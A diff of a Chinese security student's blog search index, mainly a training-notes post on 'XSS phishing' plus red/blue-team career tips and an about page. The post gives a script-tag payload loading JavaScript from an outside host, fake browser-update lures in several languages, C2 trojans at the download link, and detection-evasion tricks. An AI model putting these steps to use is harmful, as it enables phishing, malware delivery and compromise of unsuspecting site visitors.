@@ -120,11 +120,11 @@
     
     
     <entry>
-      <title>hyperion训练合集</title>
-      <link href="/2024/10/18/hyperion%E8%AE%AD%E7%BB%83%E5%90%88%E9%9B%86/"/>
-      <url>/2024/10/18/hyperion%E8%AE%AD%E7%BB%83%E5%90%88%E9%9B%86/</url>
+      <title>星盟训练合集</title>
+      <link href="/2024/10/18/%E6%98%9F%E7%9B%9F%E8%AE%AD%E7%BB%83%E5%90%88%E9%9B%86/"/>
+      <url>/2024/10/18/%E6%98%9F%E7%9B%9F%E8%AE%AD%E7%BB%83%E5%90%88%E9%9B%86/</url>
       
-        <content type="html"><![CDATA[<h2 id="xss钓鱼">xss钓鱼</h2><h3 id="payload">payload</h3><p>在把网站打下来后，在存在漏洞处放入payload：&lt;sCRiPtsRC=xss.com/asdq&gt;&lt;/sCripT&gt;</p><p>这串html脚本标签意在从外部源加载并执行一段javascript代码。</p><h3 id="具体实施">具体实施</h3><p>1、可以先放入探针测试，通过对方UA头，检查对面电脑的基本情况（windows/mac......）。这里推荐用66analytics这个工具记录整个操作的视频，包括鼠标的移动和点击情况等。</p><p>2、然后可以针对目标，放入类似flash更新，浏览器版本更新的模版。这里建议根据前面探测到的对面的语言情况设置多个语言版本，以防被察觉。</p><p>3、在模版下载处放入C2木马，等对方点击上线。放在最醒目位置的是冲锋马，此外还需要维权马和操作马。</p><h3 id="收杆">收杆</h3><p>为了防止被察觉，在差不多的时候就要进行收杆操作。</p><p>收杆有两种思路：</p><p>1、按次数来收杆，给浏览器的cookie设置值，每刷新一次就加一。</p><p>2、可以给马加一个随机数，由xss平台来生成，这样下载的时候类似chromeupdate_xxxx.exe，然后把这xxxx返回给平台，平台来控制撤杆。但是相比之下，这种方法的缺点在于易于被浏览器给检测出来。</p><h2 id="hw主题茶话会">hw主题茶话会</h2><p>接触护网：询问校企合作企业是否有护网项目，可以参加。入门蓝队流量监控，可以顺便偷学应急、溯源。蓝队：流量监控常见攻击需要一眼丁真，0day可查找关键字；溯源：用蜜罐拿到攻击信息和ip；应急响应：需要磨练能力。红队：web打点（弱口令、0day、钓鱼）、内网攻击、写工具写马。</p><p>蓝队wiki：blue.y1ng.com</p><p>蓝队技能：会看各个厂商的设备、会用各个厂商的设备、研判、排查、沟通、威胁情报（最重要）。</p><p>字典生成工具：github搜密探</p><p>面试：自信</p><p>护网注意黑中介，签合同一定要看清楚，不签背对背结款。通过后立刻开始准备，随时准备被叫走。</p><p>流量监控一定要过滤出最重要的信息</p>]]></content>
+        <content type="html"><![CDATA[<h2 id="xss钓鱼">xss钓鱼</h2><h3 id="payload">payload</h3><p>在把网站打下来后，在存在漏洞处放入payload：&lt;sCRiPtsRC=xss.com/asdq&gt;&lt;/sCripT&gt;</p><p>这串html脚本标签意在从外部源加载并执行一段javascript代码。</p><h3 id="具体实施">具体实施</h3><p>1、可以先放入探针测试，通过对方UA头，检查对面电脑的基本情况（windows/mac......）。这里推荐用66analytics这个工具记录整个操作的视频，包括鼠标的移动和点击情况等。</p><p>2、然后可以针对目标，放入类似flash更新，浏览器版本更新的模版。这里建议根据前面探测到的对面的语言情况设置多个语言版本，以防被察觉。</p><p>3、在模版下载处放入C2木马，等对方点击上线。放在最醒目位置的是冲锋马，此外还需要维权马和操作马。</p><h3 id="收杆">收杆</h3><p>为了防止被察觉，在差不多的时候就要进行收杆操作。</p><p>收杆有两种思路：</p><p>1、按次数来收杆，给浏览器的cookie设置值，每刷新一次就加一。</p><p>2、可以给马加一个随机数，由xss平台来生成，这样下载的时候类似chromeupdate_xxxx.exe，然后把这xxxx返回给平台，平台来控制撤杆。但是相比之下，这种方法的缺点在于易于被浏览器给检测出来。</p><h2 id="hw主题茶话会">hw主题茶话会</h2><p>接触护网：询问校企合作企业是否有护网项目，可以参加。入门蓝队流量监控，可以顺便偷学应急、溯源。蓝队：流量监控常见攻击需要一眼丁真，0day可查找关键字；溯源：用蜜罐拿到攻击信息和ip；应急响应：需要磨练能力。红队：web打点（弱口令、0day、钓鱼）、内网攻击、写工具写马。</p><p>蓝队wiki：blue.y1ng.com</p><p>蓝队技能：会看各个厂商的设备、会用各个厂商的设备、研判、排查、沟通、威胁情报（最重要）。</p><p>字典生成工具：github搜密探</p><p>面试：自信</p><p>护网注意黑中介，签合同一定要看清楚，不签背对背结款。通过后立刻开始准备，随时准备被叫走。</p><p>流量监控一定要过滤出最重要的信息。</p><h3 id="红队">红队：</h3><h4 id="一">一</h4><figure><img src="/images/星盟训练合集/image-20241118213024359.png"alt="image-20241118213024359" /><figcaption aria-hidden="true">image-20241118213024359</figcaption></figure><figure><img src="/images/星盟训练合集/image-20241118213039673.png"alt="image-20241118213039673" /><figcaption aria-hidden="true">image-20241118213039673</figcaption></figure><figure><img src="/images/星盟训练合集/image-20241118213054574.png"alt="image-20241118213054574" /><figcaption aria-hidden="true">image-20241118213054574</figcaption></figure><figure><img src="/images/星盟训练合集/image-20241118213111502.png"alt="image-20241118213111502" /><figcaption aria-hidden="true">image-20241118213111502</figcaption></figure><h4 id="二">二</h4><figure><img src="/images/星盟训练合集/image-20241118213406964.png"alt="image-20241118213406964" /><figcaption aria-hidden="true">image-20241118213406964</figcaption></figure><figure><img src="/images/星盟训练合集/image-20241118213421336.png"alt="image-20241118213421336" /><figcaption aria-hidden="true">image-20241118213421336</figcaption></figure><figure><img src="/images/星盟训练合集/image-20241118213434304.png"alt="image-20241118213434304" /><figcaption aria-hidden="true">image-20241118213434304</figcaption></figure><figure><img src="/images/星盟训练合集/image-20241118213447060.png"alt="image-20241118213447060" /><figcaption aria-hidden="true">image-20241118213447060</figcaption></figure><figure><img src="/images/星盟训练合集/image-20241118213456723.png"alt="image-20241118213456723" /><figcaption aria-hidden="true">image-20241118213456723</figcaption></figure><h3 id="蓝队">蓝队：</h3><figure><img src="/images/星盟训练合集/image-20241118213221571.png"alt="image-20241118213221571" /><figcaption aria-hidden="true">image-20241118213221571</figcaption></figure>]]></content>
       
       
       <categories>
@@ -1127,22 +1127,22 @@
     
     
     <entry>
-      <title>Hello, world!</title>
-      <link href="/about/index.html"/>
-      <url>/about/index.html</url>
+      <title>Categories</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
       
-        <content type="html"><![CDATA[<p>Welcome to my site, everybodyyyyy!</p><p>我是St4rr，一个刚刚入门的网安新手。最近在<del>当一个赛棍</del>打CTF，目前是X1cT34m和Hyperion（星盟预备队）的一个misc手，也稍微（真的很稍微！）懂一点点crypto。希望未来能再了解点web，对web真的是一窍不通。。。</p><p>虽然现在还是一个realvegetable，但是有句老话说的好，菜就多练。。。现阶段想先多参加点比赛，并多向师傅们学习，争取多练点技术出来吧。</p>]]></content>
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
     
     
     <entry>
-      <title>links</title>
-      <link href="/links/index.html"/>
-      <url>/links/index.html</url>
+      <title>Hello, world!</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>Welcome to my site, everybodyyyyy!</p><p>我是St4rr，一个刚刚入门的网安新手。最近在<del>当一个赛棍</del>打CTF，目前是X1cT34m和Hyperion（星盟预备队）的一个misc手，也稍微（真的很稍微！）懂一点点crypto。希望未来能再了解点web，对web真的是一窍不通。。。</p><p>虽然现在还是一个realvegetable，但是有句老话说的好，菜就多练。。。现阶段想先多参加点比赛，并多向师傅们学习，争取多练点技术出来吧。</p>]]></content>
       
     </entry>
     
@@ -1160,9 +1160,9 @@
     
     
     <entry>
-      <title>Categories</title>
-      <link href="/categories/index.html"/>
-      <url>/categories/index.html</url>
+      <title>links</title>
+      <link href="/links/index.html"/>
+      <url>/links/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
